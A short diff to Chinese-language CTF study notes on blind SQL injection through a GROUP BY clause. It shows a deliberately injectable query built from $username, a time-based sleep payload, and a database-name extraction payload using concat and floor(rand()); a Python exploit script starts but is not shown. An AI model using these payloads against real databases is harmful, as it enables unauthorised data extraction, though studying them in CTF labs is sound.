@@ -1,8 +1,10 @@
 ## **groupby盲注**
+分页查询，原意是根据username或id分组。
 ```  
-//分页查询
+//分页查询 
   $sql = select * from ctfshow_user group by $username;
 ```   
+
 时间盲注
 ```
 1,if(1=1,sleep(0.1),1)
@@ -13,6 +15,7 @@
 concat(database(),floor(rand(0)*30))
 ```
 脚本：
+原意是根据username或id分组，如此而来回显差异
 ```
 import requests
 import time
